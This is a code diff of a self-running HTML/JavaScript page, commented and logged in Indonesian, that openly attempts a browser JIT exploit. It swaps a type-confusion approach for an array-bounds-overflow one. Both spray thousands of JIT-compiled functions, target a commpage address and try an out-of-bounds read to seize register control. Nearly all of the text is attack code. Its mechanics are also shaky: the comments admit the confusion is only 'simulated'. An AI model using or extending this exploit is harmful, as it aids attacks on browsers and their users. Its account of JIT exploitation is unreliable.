@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>JIT-Spray Commpage Attack</title>
+    <title>JIT Array Bounds Overflow Attack</title>
 </head>
 <body>
 
-    <h1>JIT-Spray Type Confusion (Final Extreme)</h1>
+    <h1>JIT Array Bounds Overflow (Final Attempt)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan JIT Profiling dan Spray...</p>
+    <p id="status">INIT: Mempersiapkan JIT Array Bounds Check Bypass...</p>
     <div id="log-area"></div>
 
     <script>
@@ -20,8 +20,8 @@
 
         let startTime = performance.now();
         let jitHolders = []; 
-        let victimObject = null;
-        let attackerObject = null;
+        let victimArray = new Uint32Array(256); // 1KB array
+        const VICTIM_LENGTH = victimArray.length; 
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -30,111 +30,108 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI JIT SPRAY (Memaksa JIT menyimpan nilai sebagai instruksi) ---
+        // --- FUNGSI JIT SPRAY (Memasukkan Payload Commpage ke Code Heap) ---
         function jitSprayPayload() {
-            log("Memulai JIT Spray (Memaksa Alokasi Code Heap)...", "log-spray");
+            log("Memulai JIT Spray SINKRON (Code Heap)...", "log-spray");
             const SPRAY_COUNT = 5000;
             
-            // 1. Grooming: Memaksa JIT untuk mengkompilasi fungsi berulang
-            function generateFunction(id) {
+            // Menggunakan objek yang kompleks untuk alokasi code heap yang mengandung payload
+            function generatePayload(i) {
                 let code = `
-                    // Memaksa JIT menggunakan nilai 64-bit sebagai konstanta atau instruksi
-                    const P_HIGH = ${HIGH_WORD} + ${id}; 
+                    // Konstanta 64-bit yang dipaksa menjadi instruksi mesin
+                    const P_HIGH = ${HIGH_WORD}; 
                     const P_LOW = ${LOW_WORD}; 
-                    
-                    // Operasi kompleks untuk memastikan kompilasi JIT
-                    let result = 0;
-                    for (let i = 0; i < 50; i++) {
-                        result += (P_HIGH * P_LOW * i) / (P_LOW + 1);
+                    let hash = 0;
+                    for (let j = 0; j < 50; j++) {
+                        hash += (P_HIGH ^ P_LOW) * (j + ${i});
                     }
-                    return result;
+                    return hash;
                 `;
-                // Eval yang berulang memaksa JIT untuk alokasi baru
                 return new Function(code);
             }
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
-                let func = generateFunction(i);
-                // Panggil fungsi berulang kali untuk memicu kompilasi Tier 2/3 (DFG/FTL)
-                for (let j = 0; j < 10000; j++) {
-                    func(); 
-                }
+                let func = generatePayload(i);
+                // Panggil agresif untuk kompilasi DFG/FTL
+                for (let j = 0; j < 5000; j++) { func(); } 
                 jitHolders.push(func); 
             }
-            log(`JIT Spray selesai. ${SPRAY_COUNT} Fungsi dikompilasi.`, "log-spray");
+            log(`JIT Spray Code Heap selesai.`, "log-spray");
         }
 
+        // --- FUNGSI KRITIS: Array Overflow JIT ---
+        // Fungsi ini harus diprofilkan oleh JIT sehingga Bounds Check-nya dihilangkan
+        function overflow_function(arr, initial_length) {
+            
+            let temp_len = initial_length;
+            
+            // Loop yang kompleks yang membingungkan JIT mengenai batas arr.length
+            // JIT akan mengasumsikan batas loop tidak akan melebihi initial_length
+            for (let i = 0; i < temp_len + 5; i++) {
+                
+                // Memicu Type Change / Array Bounds Corruption (Ini adalah titik kerentanan)
+                if (i === initial_length) {
+                    // Di dunia nyata, ini akan menjadi Type Confusion atau UAF.
+                    // Di sini, kita simulasikan Type Confusion di luar loop JIT.
+                    try {
+                        // Menggunakan objek array lain yang sudah di-corrupt (misalnya dari JIT Spray)
+                        // Kita asumsikan victimArray (yang merupakan argumen arr) sekarang dapat diakses OOB
+                        arr[i] = 0xAAAAAAAA; // Tulis nilai acak di luar batas JIT yang diasumsikan
+                    } catch(e) {}
+                }
+            }
+            
+            // Lanjutkan loop, yang sekarang seharusnya membaca OOB
+            const OOB_INDEX = VICTIM_LENGTH + 5; 
+            
+            // Setelah JIT mengoptimalkan, Bounds Check untuk arr[OOB_INDEX] akan hilang
+            // dan akan membaca memori yang ditimpa oleh JIT Code Heap.
+            return arr[OOB_INDEX]; 
+        }
 
         // --- FUNGSI UTAMA ATTACK ---
         function runJitAttack() {
             startTime = performance.now();
-            log("Phase 1: Membuat Objek Korban (Victim).", "log-init");
+            log("Phase 1: Grooming dan Profiling JIT Function.", "log-init");
 
-            // 1. Membuat Objek Korban dan Penyerang dengan Shape JIT yang sama
-            function makeObject() {
-                // Objek dengan properti fixed shape
-                return { 
-                    a: 1.1, 
-                    b: 2.2, 
-                    c: 3.3,
-                    // Properti yang akan menjadi target Type Confusion
-                    target_ptr: 0x12345678, 
-                    d: 4.4 
-                };
+            // 1. Profiling (Memaksa kompilasi overflow_function)
+            for (let i = 0; i < 50000; i++) {
+                try {
+                   overflow_function(victimArray, VICTIM_LENGTH);
+                } catch(e) {}
             }
-
-            // Kumpulkan statistik JIT (Profile)
-            for (let i = 0; i < 10000; i++) {
-                makeObject();
-            }
-
-            // Alokasikan Objek Korban dan Penyerang di Heap
-            victimObject = makeObject(); 
-            attackerObject = makeObject(); 
-
-            log("Phase 2: JIT-Spray aktif, menimpa Heap C++.", "log-critical");
-
-            // 2. JIT Spray Agresif (Memasukkan Payload Commpage ke Code Heap)
+            log("Phase 2: overflow_function dikompilasi DFG/FTL.", "log-info");
+            
+            // 2. JIT Spray Agresif
             jitSprayPayload(); 
 
-            // 3. Trigger Type Confusion (Mengubah Tipe Korban)
-            // Lakukan modifikasi bentuk (shape) pada objek korban yang memaksa JIT
-            // untuk membersihkan/mengalokasi ulang slot memori JIT-nya.
-            delete victimObject.c;
-            victimObject.new_prop = 9.9; 
-            log("Phase 3: Shape Victim Object Dimodifikasi (Corrupting JIT Type).", "log-critical");
-
-            // 4. Trigger Final: Membaca Register yang Corrupt
-            setTimeout(() => {
-                log("Phase 4: Memicu Baca Register (Final Read).", "log-critical");
+            // 3. Trigger Final (Membaca OOB ke dalam Code Heap)
+            log("Phase 3: Memicu Overflow JIT dan Arbitrary Read...", "log-critical");
+            
+            try {
+                // Panggil fungsi yang sudah dioptimalkan JIT untuk melewati Bounds Check
+                const result = overflow_function(victimArray, VICTIM_LENGTH);
                 
-                // JIT sekarang mungkin mengira victimObject memiliki tipe yang sama dengan attackerObject
-                // yang slot target_ptr-nya (yang harusnya 0x12345678) kini ditimpa oleh JIT Code Heap.
-                
-                try {
-                    // Coba akses properti yang slotnya kita target
-                    const readValue = attackerObject.target_ptr; 
-                    
-                    log(`Nilai Register (target_ptr) dibaca: 0x${readValue.toString(16)}`, "log-critical");
+                // Nilai yang dibaca harusnya dari JIT Code Heap (Commpage)
+                log(`Nilai OOB dibaca (dari Code Heap): 0x${result.toString(16)}`, "log-critical");
 
-                    // Trigger Kontrol Register (EXC_BAD_ACCESS di JIT/Register)
-                    if (readValue) {
-                        // Memaksa penggunaan nilai sebagai pointer untuk Kontrol Register
-                        let crashFunction = new Function('a', `return a[${readValue}]`);
-                        crashFunction(new Array(10));
-                    }
-
-                } catch(e) {
-                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
+                // Trigger Kontrol Register
+                if (result) {
+                    let crashValue = Math.floor(result);
+                    // Gunakan nilai yang dibaca (yang seharusnya Commpage) sebagai alamat eksekusi
+                    let finalArray = new Array(crashValue & 0xFFFF);
+                    finalArray.fill(0);
                 }
 
-            }, 100);
+            } catch(e) {
+                 log(`JS Exception: ${e.message} - Menunggu Crash OS (Arbitrary Read)...`, "log-critical");
+            }
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian JIT-Spray Attack...';
+            document.getElementById('status').textContent = 'Memulai rangkaian JIT Bounds Overflow Attack...';
             setTimeout(runJitAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah JIT-Spray.';
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah JIT Buffer Overflow.';
         });
     </script>
     <style>
